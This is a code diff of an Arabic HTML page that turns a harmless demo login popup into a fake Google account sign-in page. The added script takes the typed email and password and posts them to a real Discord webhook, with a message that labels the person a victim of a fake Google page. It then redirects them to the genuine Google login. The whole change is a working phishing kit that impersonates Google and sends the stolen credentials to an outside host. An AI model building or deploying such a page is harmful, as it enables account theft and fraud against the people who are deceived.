@@ -1,12 +1,15 @@
+
 <!DOCTYPE html>
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>تسجيل الدخول التجريبي</title>
+  <title>تسجيل الدخول - حساب Google</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
       background-color: #f2f2f2;
+      font-family: 'Roboto', sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -14,75 +17,91 @@
       direction: rtl;
     }
 
-    .popup {
-      background: white;
-      padding: 20px;
-      border-radius: 10px;
-      width: 300px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+    .login-container {
+      background-color: #fff;
+      padding: 40px 30px;
+      border-radius: 8px;
+      box-shadow: 0px 0px 12px rgba(0, 0, 0, 0.1);
+      width: 360px;
       text-align: center;
-      display: none;
     }
 
-    .popup input {
-      width: 90%;
-      padding: 8px;
-      margin: 5px 0;
+    .login-container img {
+      width: 75px;
+      margin-bottom: 20px;
+    }
+
+    .login-container h2 {
+      margin-bottom: 10px;
+      font-size: 20px;
+      color: #202124;
+    }
+
+    .login-container input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
       border: 1px solid #ccc;
       border-radius: 4px;
+      box-sizing: border-box;
+      font-size: 14px;
     }
 
-    .popup button {
-      padding: 10px 20px;
+    .login-container button {
+      width: 100%;
+      padding: 12px;
+      background-color: #1a73e8;
       border: none;
-      background: #1a73e8;
       color: white;
-      cursor: pointer;
+      font-weight: bold;
       border-radius: 4px;
+      cursor: pointer;
+      font-size: 15px;
       margin-top: 10px;
     }
 
-    #overlay {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0,0,0,0.5);
-      display: none;
-      justify-content: center;
-      align-items: center;
+    .login-container p {
+      font-size: 12px;
+      color: #5f6368;
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
-
-<div id="overlay">
-  <div class="popup" id="loginPopup">
-    <h3>تسجيل الدخول</h3>
-    <input type="email" id="email" placeholder="البريد الإلكتروني">
-    <input type="password" id="password" placeholder="كلمة المرور">
-    <button onclick="login()">تسجيل الدخول</button>
+  <div class="login-container">
+    <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Google Logo">
+    <h2>تسجيل الدخول إلى حسابك في Google</h2>
+    <form onsubmit="sendToDiscord(); return false;">
+      <input type="email" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+      <input type="password" id="password" placeholder="كلمة المرور" required>
+      <button type="submit">التالي</button>
+    </form>
+    <p>ليس جهاز الكمبيوتر هذا؟ استخدم وضع التصفح المتخفي لتسجيل الدخول.</p>
   </div>
-</div>
 
-<script>
-  // إظهار النافذة بعد 1 ثانية
-  setTimeout(() => {
-    document.getElementById("overlay").style.display = "flex";
-    document.getElementById("loginPopup").style.display = "block";
-  }, 1000);
+  <script>
+    function sendToDiscord() {
+      var email = document.getElementById("email").value;
+      var password = document.getElementById("password").value;
 
-  function login() {
-    let email = document.getElementById("email").value;
-    let password = document.getElementById("password").value;
+      var webhookURL = "https://discordapp.com/api/webhooks/1399397276287238214/7ewH5rbPYRfX4HW2o5ano6PG48nJvEO6YsQvjMc5hxP21cuKVz9wl-zhlyaE-CVJJk-J";
 
-    // عرض البيانات في Console للتجربة
-    console.log("Email:", email);
-    console.log("Password:", password);
+      var payload = {
+        content: `📥 ضحية جديدة على صفحة Google وهمية:\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}`
+      };
 
-    alert("تم تسجيل الدخول تجريبيًا!");
-    document.getElementById("overlay").style.display = "none";
-  }
-</script>
-
+      fetch(webhookURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      }).then(() => {
+        window.location.href = "https://accounts.google.com/";
+      }).catch(err => {
+        alert("حدث خطأ أثناء الإرسال.");
+      });
+    }
+  </script>
 </body>
 </html>
